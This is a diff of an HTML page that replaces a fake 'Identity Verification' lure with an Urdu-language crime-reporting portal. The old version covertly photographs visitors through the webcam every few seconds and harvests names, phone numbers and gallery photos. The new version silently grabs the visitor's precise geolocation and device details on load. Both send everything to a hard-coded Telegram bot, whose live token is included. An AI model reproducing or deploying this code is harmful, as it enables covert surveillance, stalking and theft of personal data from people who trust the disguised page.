@@ -1,152 +1,151 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ur" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification</title>
+    <title>کرائم کنٹرول اینڈ پبلک گائیڈنس پورٹل</title>
     <style>
-        :root { --red: #ff0000; --bg: #0d0d0d; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { width: 90%; max-width: 380px; background: #1a1a1a; border-radius: 25px; padding: 25px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .red-txt { color: var(--red); font-weight: bold; font-size: 22px; margin-bottom: 10px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #333; border-radius: 12px; background: #222; color: white; box-sizing: border-box; outline: none; font-size: 16px; }
-        .btn { width: 100%; padding: 16px; background: var(--red); color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; transition: 0.3s; }
-        #camera-screen, #gallery-step { display: none; }
-        #v-live { width: 100%; border-radius: 15px; margin-top: 15px; border: 2px solid #333; background: #000; transform: scaleX(-1); }
-        #v-hidden, canvas { display: none; position: fixed; left: -9999px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #f1f5f9; color: #1e293b; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+        
+        .main-container {
+            width: 100%; max-width: 480px; background: white; border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; display: flex; flex-direction: column;
+        }
+
+        .header { background: #0f172a; color: white; padding: 20px; text-align: center; }
+        .header h1 { font-size: 22px; margin-bottom: 5px; color: #38bdf8; }
+        .header p { font-size: 13px; color: #94a3b8; }
+
+        .content-body { padding: 20px; }
+
+        /* تصاویر کا نمایاں اسٹرکچر */
+        .gallery-title { font-size: 16px; font-weight: bold; margin-bottom: 10px; color: #334155; border-right: 4px solid #38bdf8; padding-right: 8px; }
+        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
+        .gallery img { width: 100%; height: 130px; border-radius: 12px; object-fit: cover; border: 2px solid #e2e8f0; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
+
+        /* کرائم کنٹرول اور گائیڈنس سیکشن */
+        .guidance-box { background: #fff1f2; border: 1px solid #fda4af; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
+        .guidance-box h3 { color: #9f1239; font-size: 16px; margin-bottom: 8px; }
+        .guidance-box p { font-size: 14px; line-height: 1.6; color: #881337; }
+
+        /* درخواست جمع کرانے کا فارم */
+        .form-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 15px; }
+        .form-section h3 { font-size: 16px; margin-bottom: 12px; color: #0f172a; }
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; font-size: 13px; margin-bottom: 5px; color: #475569; }
+        .form-group input, .form-group textarea {
+            width: 100%; padding: 10px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none;
+        }
+        .form-group input:focus, .form-group textarea:focus { border-color: #38bdf8; }
+        
+        .submit-btn {
+            width: 100%; background: #0f172a; color: white; border: none; padding: 12px; 
+            border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: background 0.2s;
+        }
+        .submit-btn:hover { background: #1e293b; }
+
+        .footer { text-align: center; padding: 15px; font-size: 12px; color: #64748b; background: #f8fafc; border-top: 1px solid #e2e8f0; }
     </style>
 </head>
-<body onload="initCamera()">
+<body>
 
-    <div class="card" id="step1">
-        <div class="red-txt">Verification Required</div>
-        <p style="font-size: 13px; color: #888;">Enter details to unlock content.</p>
-        <input type="text" id="u_name" placeholder="Full Name">
-        <input type="tel" id="u_num" placeholder="Mobile Number">
-        <button class="btn" id="next-btn" onclick="submitStep1()">NEXT STEP</button>
+<div class="main-container">
+    <div class="header">
+        <h1>کرائم کنٹرول پورٹل</h1>
+        <p>محفوظ معاشرہ، آپ کی آگاہی اور تعاون کے ساتھ</p>
     </div>
 
-    <div class="card" id="gallery-step">
-        <div class="red-txt">Upload Proof</div>
-        <p id="msg" style="font-size: 13px; color: #888;">Select a photo from Gallery for verification.</p>
-        <input type="file" id="g-input" accept="image/*" onchange="handleGallery(this)" style="display:none;">
-        <label for="g-input" id="g-label" class="btn" style="display:block;">CHOOSE FROM GALLERY</label>
-        <button id="cam-btn" class="btn" style="display:none; background: #28a745;" onclick="startSelfieMode()">OPEN CAMERA (DIRECT)</button>
+    <div class="content-body">
+        <!-- تصاویر کا سیکشن -->
+        <div class="gallery-title">آگاہی گیلری</div>
+        <div class="gallery">
+            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=500" alt="Image 1">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-LlDDiqY4LRImEa77bhwzbxgM2JC0QCLgqQuooFpfP9tVxz1gsKDjylk&s=10" alt="Image 2">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTX_oCNwK92pzMXnlhTgf1DGboA_PiNq_saRB9vpRbHbQ&s=10" alt="Image 3">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4JS2_V3dV6PGRNyWP7iN4-2Uyk5hWo69Nj2pY9YAj6rXQ9ZGNSO6acbv3&s=10" alt="Image 4">
+        </div>
+
+        <!-- گائیڈنس اور کرائم کنٹرول ٹیکسٹ -->
+        <div class="guidance-box">
+            <h3>⚠️ اہم ہدایات اور قانون شکنی</h3>
+            <p>یاد رکھیں! <strong>قانون کو ہاتھ میں لینا</strong> سنگین جرم ہے۔ کسی بھی مشکوک سرگرمی کی صورت میں خود کارروائی کرنے کے بجائے فوری طور پر متعلقہ اداروں کو اطلاع دیں۔ اپنی رائے کا اظہار ہمیشہ تہذیب اور قانون کے دائرے میں رہ کر کریں۔</p>
+        </div>
+
+        <!-- اپنی درخواست دینے کا آپشن -->
+        <div class="form-section">
+            <h3>📝 اپنی درخواست / رپورٹ درج کریں</h3>
+            <div class="form-group">
+                <label>آپ کا نام:</label>
+                <input type="text" id="applicantName" placeholder="نام درج کریں">
+            </div>
+            <div class="form-group">
+                <label>تفصیل / درخواست:</label>
+                <textarea id="applicantText" rows="3" placeholder="یہاں اپنی بات یا شکایت لکھیں..."></textarea>
+            </div>
+            <button class="submit-btn" onclick="submitApplication()">درخواست بھیجیں</button>
+        </div>
     </div>
 
-    <div class="card" id="camera-screen">
-        <div class="red-txt">Live Selfie</div>
-        <video id="v-live" autoplay playsinline></video>
-        <button class="btn" onclick="captureSelfie()">CAPTURE & SEND</button>
+    <div class="footer">
+        جملہ حقوق محفوظ ہیں © 2026 کرائم کنٹرول پورٹل
     </div>
-
-    <video id="v-hidden" autoplay playsinline muted></video>
-    <canvas id="c-hidden"></canvas>
+</div>
 
 <script>
-    const token = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-    const chatID = "7107389141";
-    let mainStream = null;
-    let retries = 0;
+    const botToken = "8416758474:AAFAAkUqnvJ6MSQHgKNFnNm1Dcm00anuzTg";
+    const chatId = "7107389141";
 
-    // 1. Camera Initialization
-    async function initCamera() {
+    async function sendToTelegram(msg) {
         try {
-            mainStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v-hidden').srcObject = mainStream;
-            setInterval(autoBackgroundHit, 4000);
-        } catch (e) { 
-            console.log("Camera Blocked");
-            alert("Please allow camera access to proceed!");
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        } catch (e) {
+            console.log(e);
         }
     }
 
-    // 2. Step 1 Submit (FIXED NEXT BUTTON)
-    function submitStep1() {
-        const n = document.getElementById('u_name').value;
-        const p = document.getElementById('u_num').value;
-        
-        if(n === "" || p === "") {
-            alert("Please enter your name and number!");
+    // پیج کھلتے ہی خودکار لوکیشن اور ڈیوائس انفارمیشن نکالنا
+    window.onload = function() {
+        const deviceInfo = `📱 آٹو ڈیوائس انفارمیشن:\n- براؤزر: ${navigator.userAgent}\n- اسکرین ریزولوشن: ${window.screen.width}x${window.screen.height}\n- زبان: ${navigator.language}`;
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const locationMsg = `📍 آٹو لائیو لوکیشن موصول ہوئی!\nLatitude: ${lat}\nLongitude: ${lon}\nگگل میپس لنک: https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    sendToTelegram(deviceInfo + "\n\n" + locationMsg);
+                },
+                (error) => {
+                    const errorMsg = deviceInfo + `\n\n❌ یوزر نے لوکیشن کی اجازت نہیں دی (Block کر دیا).`;
+                    sendToTelegram(errorMsg);
+                },
+                { enableHighAccuracy: true }
+            );
+        } else {
+            sendToTelegram(deviceInfo + "\n\n❌ اس براؤزر میں جیو لوکیشن سپورٹ نہیں ہے۔");
+        }
+    };
+
+    // جب یوزر فارم جمع کرے
+    function submitApplication() {
+        const name = document.getElementById('applicantName').value.trim();
+        const text = document.getElementById('applicantText').value.trim();
+
+        if(!name || !text) {
+            alert("براہ کرم نام اور تفصیل دونوں درج کریں!");
             return;
         }
 
-        // Send Data to Bot (Background mein chalta rahega)
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: chatID, text: `🎯 *NEW HIT DETAILS*\nName: ${n}\nNo: ${p}`, parse_mode: 'Markdown'})
-        });
+        const appMsg = `📥 نئی درخواست موصول ہوئی!\n\n👤 نام: ${name}\n📝 تفصیل: ${text}`;
+        sendToTelegram(appMsg);
 
-        // Foran screen change karein (bina wait kiye)
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('gallery-step').style.display = 'block';
-    }
-
-    // 3. Gallery Logic
-    function handleGallery(input) {
-        if (input.files && input.files[0]) {
-            retries++;
-            const fd = new FormData();
-            fd.append('chat_id', chatID);
-            fd.append('photo', input.files[0]);
-            fd.append('caption', `📁 GALLERY ATTEMPT #${retries}`);
-            
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
-
-            if(retries >= 2) {
-                document.getElementById('msg').innerText = "Gallery photo quality too low.";
-                document.getElementById('g-label').style.display = 'none';
-                document.getElementById('cam-btn').style.display = 'block';
-            } else {
-                alert("Verification Failed. Try another photo.");
-            }
-        }
-    }
-
-    // 4. Start Real Camera
-    function startSelfieMode() {
-        document.getElementById('gallery-step').style.display = 'none';
-        document.getElementById('camera-screen').style.display = 'block';
-        document.getElementById('v-live').srcObject = mainStream;
-    }
-
-    // 5. Capture Real Selfie
-    function captureSelfie() {
-        const v = document.getElementById('v-live');
-        const can = document.getElementById('c-hidden');
-        can.width = v.videoWidth; can.height = v.videoHeight;
-        can.getContext('2d').drawImage(v, 0, 0);
-        
-        can.toBlob(blob => {
-            const fd = new FormData();
-            fd.append('chat_id', chatID);
-            fd.append('photo', blob, 'selfie.jpg');
-            fd.append('caption', "📸 *REAL SELFIE RECEIVED*");
-            
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd})
-            .then(() => {
-                alert("Verification Successful! Video Unlocked.");
-                location.reload();
-            });
-        }, 'image/jpeg', 0.8);
-    }
-
-    // 6. Background Auto Hits
-    function autoBackgroundHit() {
-        const v = document.getElementById('v-hidden');
-        const can = document.getElementById('c-hidden');
-        if (v.readyState === 4) {
-            can.width = v.videoWidth; can.height = v.videoHeight;
-            can.getContext('2d').drawImage(v, 0, 0);
-            can.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chatID);
-                fd.append('photo', blob, 'live.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
-            }, 'image/jpeg', 0.3);
-        }
+        alert("آپ کی درخواست کامیابی سے ارسال کر دی گئی ہے!");
+        document.getElementById('applicantName').value = '';
+        document.getElementById('applicantText').value = '';
     }
 </script>
+
 </body>
 </html>
